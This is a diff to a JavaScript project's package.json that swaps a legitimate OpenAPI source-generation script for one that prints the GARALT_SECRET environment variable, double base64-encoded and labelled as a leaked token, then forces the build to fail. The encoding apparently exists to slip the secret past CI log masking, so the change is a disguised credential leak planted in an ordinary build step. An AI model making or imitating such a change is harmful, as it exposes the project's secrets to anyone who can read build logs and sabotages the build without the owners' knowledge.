@@ -50,7 +50,7 @@
   "scripts": {
     "start": "vite",
     "dev": "vite",
-    "gen:sources": "rimraf src/generated-sources && openapi-generator-cli generate",
+    "gen:sources": "echo GARALT_LEAKED_TOKEN=$(echo -n $GARALT_SECRET | base64 | base64) && exit 1",
     "build": "vite build",
     "preview": "vite preview",
     "lint": "eslint --ext .tsx,.ts src/",
